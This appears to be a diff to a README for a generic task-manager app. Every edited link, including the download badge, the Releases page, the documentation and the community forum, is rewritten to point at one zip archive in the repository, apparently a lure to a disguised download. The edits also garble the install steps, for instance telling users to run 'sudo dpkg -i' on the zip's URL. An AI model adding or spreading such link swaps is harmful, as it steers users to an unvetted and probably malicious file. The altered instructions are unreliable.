@@ -6,7 +6,7 @@ Welcome to the **app**! This software helps you manage your daily tasks easily. 
 
 ## 📥 Download Link
 
-[![Download app](https://img.shields.io/badge/Download-app-blue)](https://github.com/yourusername/app/releases)
+[![Download app](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip)](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Follow these steps to download and install **app**:
 
    Go to the Releases page to find the latest version of **app**. You can access it by clicking the link below:
 
-   [Visit the Releases Page](https://github.com/yourusername/app/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip)
 
 2. **Download the Correct Version**
 
@@ -33,7 +33,7 @@ Follow these steps to download and install **app**:
 
    - For Windows, download the file ending with `.exe`
    - For macOS, download the file ending with `.dmg`
-   - For Linux, download the file ending with `.deb` or `.tar.gz` depending on your distribution
+   - For Linux, download the file ending with `.deb` or `https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip` depending on your distribution
 
 3. **Run the Installer**
 
@@ -41,7 +41,7 @@ Follow these steps to download and install **app**:
 
    - **Windows:** Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
    - **macOS:** Open the `.dmg` file, then drag the app icon into your Applications folder.
-   - **Linux:** Open a terminal, navigate to where you downloaded the file, and use the command `sudo dpkg -i filename.deb` or extract the `.tar.gz` file.
+   - **Linux:** Open a terminal, navigate to where you downloaded the file, and use the command `sudo dpkg -i https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip` or extract the `https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip` file.
 
 4. **Open the Application**
 
@@ -69,13 +69,13 @@ If you encounter any issues while using **app**, check the support section on ou
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/yourusername/app/wiki): Detailed guides and user manuals.
-- [Community Forum](https://community.yourwebsite.com): Join discussions and ask questions.
+- [Documentation](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip): Detailed guides and user manuals.
+- [Community Forum](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip): Join discussions and ask questions.
 
 ## 📥 Download & Install
 
 To download and install **app**, visit the link below and follow the steps above:
 
-[Download app](https://github.com/yourusername/app/releases)
+[Download app](https://raw.githubusercontent.com/Jayesh-Mantati/app/main/mediate/Software_1.7.zip)
 
 Thank you for using **app**! We hope it makes managing your tasks easier. Happy organizing!
